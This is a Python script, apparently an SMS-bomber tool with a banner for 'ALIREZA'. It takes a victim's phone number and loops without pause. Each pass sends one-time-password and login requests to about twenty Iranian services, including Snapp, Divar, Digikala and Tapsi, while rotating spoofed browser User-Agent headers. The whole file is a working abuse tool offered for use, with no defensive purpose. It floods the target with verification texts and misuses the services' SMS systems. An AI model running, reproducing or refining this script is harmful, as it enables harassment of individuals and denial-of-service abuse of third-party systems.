
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'




import requests
import random
import time
import pyfiglet

import pyfiglet
ll = pyfiglet.figlet_format('     A L I R E Z A  ')
print(Z+ll)

ajaj = pyfiglet.figlet_format('            9  3  .  5  5')
print(B+ajaj)


number = input("Inter phone number (without 0) : ")
url_snapp= "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp= {"cellphone":"+98" + number}

url_divar= "https://api.divar.ir/v5/auth/authenticate"
json_divar= {"phone":"0" + number}

url_behtarino= "https://api.behtarino.com/api/v1/users/phone_verification/"
json_behtarino= {"phone": "0" + number}

url_cinematec= "https://cinematicket.org/api/v1/users/signup"
json_cinematec= {"phone_number": "98" + number}

url_digikala= "https://api.digikala.com/v1/user/authenticate/"
json_digikala= {"backUrl": "/","username": "0" + number}

url_alibaba= "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json_alibaba= {"phoneNumber": "0" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=2a99fa09-82d5-4857-9f79-88e7b88ffabf&locale=fa"
json_sf= {"cellphone":"0" + number}

url_sm= "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=number"
json_sm= {"cellphone": "0" + number}

url_sheypoor= "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor= {"username": "0" + number}

url_banimode= "https://mobapi.banimode.com/api/v2/auth/request"
json_banimode= {"phone": "0" + number}

url_sd= "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/cellphone=number"
json_sd= {"cellphone":"+98" + number}

url_dd= "https://drdr.ir/api/registerEnrollment/verifyMobile"
json_dd= {"phoneNumber": "0" + number, "userType": "PATIENT"}

url_mrbilit= "https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=number&source=2&sendTokenIfNot=true"
json_mrbilit= {"mobileOrEmail": "0" + number}

url_bazar= "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
json_bazar= {"username": "98" + number}

url_telew= "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
json_telew= {"code": "98", "phone": number, "smsStatus": "default"}

url_gap= "https://core.gap.im/v1/user/add.json?mobile=user"
json_gap= {"mobile": "+98" + number}

url_tapsi= "https://api.tapsi.cab/api/v2.2/user"
json_tapsi= {"credential": {"phoneNumber": "0" + number, "role": "PASSENGER"}}

url_aparat= "https://www.aparat.com/api/fa/v1/user/Authenticate/signin_step1?callbackType=postmessage"
json_aparat= {"temp_id":"474674","account":"0","codepass_type":"otp","guid":"3433103F-9DE0-6E66-5829-B02DFE66EEF0" + number}

url_sb= "https://cpanel.snapp-box.com/api/v2/auth/otp/send"
json_sb= {"phoneNumber":"0" + number}

url_virgool= "https://virgool.io/api/v1.4/auth/verify"
json_virgool= {"method":"phone","identifier":"+98" + number}

heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    }
 ]


import pyfiglet
lll = pyfiglet.figlet_format('   D O N E  ')
print(G+lll)




while True:
    random_head = random.choice(heads)
    req = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req)

    req1 = requests.post(url=url_divar,json=json_divar,headers=random_head)
    print(req1)

    req2 = requests.post(url=url_behtarino,json=json_behtarino,headers=random_head)
    print(req2)

    req3 = requests.post(url=url_cinematec,json=json_cinematec,headers=random_head)
    print(req3)

    req4 = requests.post(url=url_digikala,json=json_digikala,headers=random_head)
    print(req4)

    req5 = requests.post(url=url_alibaba,json=json_alibaba,headers=random_head)
    print(req5)

    req6 = requests.post(url=url_sf,json=json_sf,headers=random_head)
    print(req6)

    req7 = requests.post(url=url_sm,json=json_sm,headers=random_head) 
    print(req7)

    req8 = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print(req8)

    req9 = requests.post(url=url_banimode,json=json_banimode,headers=random_head)
    print(req9)

    req10 = requests.post(url=url_sd,json=json_sd,headers=random_head)
    print(req10)

    req11 = requests.post(url=url_dd,json=json_dd,headers=random_head)
    print(req11)

    req12 = requests.post(url=url_mrbilit,json=json_mrbilit,headers=random_head)
    print(req12)

    req13 = requests.post(url=url_bazar,json=json_bazar,headers=random_head)
    print(req13)

    req14 = requests.post(url=url_telew,json=json_telew,headers=random_head)
    print(req14)

    req15 = requests.post(url=url_gap,json=json_gap,headers=random_head)
    print(req15)

    req16 = requests.post(url=url_tapsi,json=json_tapsi,headers=random_head)
    print(req16)

    req17 = requests.post(url=url_aparat,json=json_aparat,headers=random_head)
    print(req17)

    req18 = requests.post(url=url_sb,json=json_sb,headers=random_head)
    print(req18)

    req19 = requests.post(url=url_virgool,json=json_virgool,headers=random_head)
    print(req19)

    time.sleep(0)